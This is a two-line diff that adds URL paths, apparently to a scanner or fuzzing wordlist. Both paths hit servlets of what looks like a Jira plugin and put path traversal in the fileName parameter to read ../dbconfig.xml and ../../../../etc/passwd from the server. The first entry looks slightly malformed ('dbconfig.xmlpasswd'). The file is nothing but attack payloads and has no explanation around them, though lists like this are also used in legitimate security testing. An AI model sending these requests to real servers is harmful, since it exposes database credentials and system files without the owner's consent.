@@ -1,0 +1,2 @@
+/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime
+/plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd&fileMime=$textMime
